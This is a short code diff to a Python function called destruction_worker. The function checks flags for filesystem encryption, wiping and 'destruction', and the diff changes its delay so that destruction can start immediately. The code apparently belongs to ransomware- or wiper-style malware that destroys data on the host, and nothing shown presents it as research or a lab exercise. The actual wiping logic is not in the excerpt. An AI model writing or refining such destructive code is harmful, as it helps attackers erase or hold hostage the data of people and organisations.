@@ -427,8 +427,9 @@ def destruction_worker():
     if not (ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION):
         return
     
-    # Wait before starting destruction
-    time.sleep(DESTRUCTION_DELAY)
+    # Wait before starting destruction (0 = immediate)
+    if DESTRUCTION_DELAY > 0:
+        time.sleep(DESTRUCTION_DELAY)
     
     # Run complete destruction once if enabled
     if ENABLE_FILESYSTEM_DESTRUCTION:
